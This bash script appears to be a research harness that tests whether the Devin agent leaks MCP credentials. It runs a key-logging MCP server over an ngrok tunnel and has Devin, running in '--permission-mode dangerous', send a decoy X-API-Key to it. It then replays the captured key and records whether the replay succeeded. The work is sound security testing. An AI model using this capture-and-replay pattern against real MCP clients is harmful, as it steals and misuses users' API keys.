#!/usr/bin/env bash
# F8: MCP credential capture + replay — run against Devin via remote MCP (ngrok).
#
# Starts an MCP server that logs the client's X-API-Key, exposes it over ngrok,
# configures Devin to send a decoy key header, and triggers a tool call.
# Then performs a replay call using the captured key.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
RESULTS_DIR="${DEVIN_RESULTS_DIR:-$ROOT/artifacts/devin-experiments/f8-mcp-credential-replay-devin}"
PORT="${MCP_PORT:-8922}"
mkdir -p "$RESULTS_DIR"

SERVER_LOG="$RESULTS_DIR/mcp-server.log"
NGROK_LOG="$RESULTS_DIR/ngrok.log"
KEY_LOG="$RESULTS_DIR/captured_keys.log"
DEVIN_LOG="$RESULTS_DIR/devin.log"
CLIENT_REPLAY="$RESULTS_DIR/replay.json"
SUMMARY="$RESULTS_DIR/f8-mcp-credential-replay.devin.summary.json"

SERVER_NAME="f8-keylog"
DECOY_KEY="devin_f8_decoy_key_$(date +%s)"

cleanup() {
  devin mcp remove --scope user "$SERVER_NAME" 2>/dev/null || true
  if [[ -n "${NGROK_PID:-}" ]]; then
    kill "$NGROK_PID" 2>/dev/null || true
    wait "$NGROK_PID" 2>/dev/null || true
  fi
  if [[ -n "${SERVER_PID:-}" ]]; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT

if ! command -v devin >/dev/null 2>&1; then
  echo "devin CLI required" >&2
  exit 1
fi
if ! command -v ngrok >/dev/null 2>&1; then
  echo "ngrok required" >&2
  exit 1
fi

: >"$SERVER_LOG"
: >"$NGROK_LOG"
: >"$KEY_LOG"
: >"$DEVIN_LOG"

AGENT_RECEIPTS_MCP_API_KEY="$DECOY_KEY" \
python3.11 "$ROOT/examples/mcp_api_key_logger_server.py" \
  --transport streamable-http \
  --host 0.0.0.0 \
  --port "$PORT" \
  --key-log "$KEY_LOG" \
  >"$SERVER_LOG" 2>&1 &
SERVER_PID=$!
sleep 0.6

ngrok http "$PORT" --log=stdout >"$NGROK_LOG" 2>&1 &
NGROK_PID=$!

PUBLIC_URL=""
for _ in $(seq 1 40); do
  PUBLIC_URL="$(
    curl -s http://127.0.0.1:4040/api/tunnels \
      | python3 -c 'import sys,json; ts=json.load(sys.stdin).get("tunnels",[]); print(next((t.get("public_url","") for t in ts if t.get("public_url","").startswith("https://")), ""))' 2>/dev/null || true
  )"
  [[ -n "$PUBLIC_URL" ]] && break
  sleep 0.5
done
if [[ -z "$PUBLIC_URL" ]]; then
  echo "error: ngrok public URL not detected (see $NGROK_LOG)" >&2
  exit 2
fi
MCP_URL="$PUBLIC_URL/mcp"

devin mcp remove --scope user "$SERVER_NAME" 2>/dev/null || true
devin mcp add --scope user --transport http "$SERVER_NAME" "$MCP_URL" -H "X-API-Key: $DECOY_KEY" >/dev/null

prompt=$'You have access to an MCP server.\nCall score_transaction with transaction_id="tx-f8" exactly once.\nThen print the returned JSON.\n'
devin --permission-mode dangerous -p "$prompt" 2>&1 | tee "$DEVIN_LOG" >/dev/null || true

captured="$(tail -n 1 "$KEY_LOG" | tr -d '\r\n' || true)"

ROOT="$ROOT" CAPTURED_KEY="$captured" MCP_URL="$MCP_URL" python3.11 - <<'PY' >"$CLIENT_REPLAY"
import asyncio
import json
import os
from pathlib import Path

import sys
sys.path.insert(0, os.environ["ROOT"])

from agentauth.receipts.mcp_client import McpConnectionSpec, connect_mcp  # noqa: E402

async def do_call(url: str, api_key: str) -> dict:
    spec = McpConnectionSpec(transport="streamable-http", url=url, api_key=api_key)
    async with connect_mcp(spec) as session:
        await session.initialize()
        res = await session.call_tool("score_transaction", {"transaction_id": "tx-f8-replay"})
        return {"ok": (not res.isError)}

url = os.environ["MCP_URL"]
key = os.environ.get("CAPTURED_KEY", "")
out = {"ok": False, "error": "no key captured"}
try:
    if key:
        out = asyncio.run(do_call(url, key))
except Exception as exc:
    out = {"ok": False, "error": str(exc)}
print(json.dumps(out))
PY

RESULTS_DIR="$RESULTS_DIR" MCP_URL="$MCP_URL" python3.11 - <<'PY' >"$SUMMARY"
import json
import os
from pathlib import Path

root = Path(os.environ["RESULTS_DIR"])
key_log = root / "captured_keys.log"
captured = key_log.read_text(encoding="utf-8", errors="replace").splitlines()
replay = json.loads((root / "replay.json").read_text(encoding="utf-8"))

print(json.dumps({
  "mcp_url": os.environ["MCP_URL"],
  "server_name": "f8-keylog",
  "decoy_key_sent": True,
  "captured_key_count": len(captured),
  "captured_key_tail": captured[-3:],
  "replay": replay,
  "replay_succeeded": bool(replay.get("ok")),
}, indent=2))
PY

echo "Wrote $SUMMARY"
